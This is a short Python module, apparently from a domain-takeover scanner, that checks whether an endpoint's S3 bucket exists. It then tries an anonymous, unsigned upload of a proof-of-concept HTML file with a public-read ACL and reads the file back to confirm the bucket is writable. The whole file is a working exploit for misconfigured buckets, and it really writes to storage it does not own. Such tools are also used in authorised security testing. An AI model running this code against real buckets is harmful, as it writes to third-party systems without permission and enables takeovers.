from linker import *

upload_name = 'domainker_aws_poc.html'
upload_body = """<html>
<!-- DOMAINKER_TAKEOVER(This is a vuln host) -->
</html>"""

def tkaws(bucket):
	s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
	try:
		s3.put_object(Bucket=bucket, Key=upload_name,ACL='public-read', Body=StringIO(unicode(upload_body)).read())
		response = requests.get("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)).content
		if upload_body in response:
			return "%sFile Uploaded And Accessable %s::%s %s%s" %(
						Fore.GREEN,
						Fore.YELLOW,
						Fore.LIGHTWHITE_EX,
						"http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name),
						Fore.RESET
					)
		else:
			return "%sFile Uploaded And not Accessable%s" %(Fore.BLUE,Fore.RESET)
	except Exception as e:
		return "%sAccess Denied%s" %(Fore.RED,Fore.RESET)


def chkaws(endpoint,timeout):
	bucket = helpers.urlify(endpoint)['HOST']

	try:
		aws = requests.head("http://%s.s3.amazonaws.com" % bucket,timeout=timeout)
		if aws.status_code == 404:
			return '%sNo [AWS] Bucket Associated With The Endpoint' % (Fore.RED)
		else:
			msg = '%sFound [AWS] Bucket %s::%s ' "http://%s.s3.amazonaws.com%s" % (Fore.GREEN,Fore.YELLOW,Fore.LIGHTWHITE_EX,bucket,Fore.RESET)
			msg += '\n        |> Upload Result [%s]' % tkaws(bucket)
			return msg
	except Exception as e:
		return '%sUnreachable' % (Fore.RED)
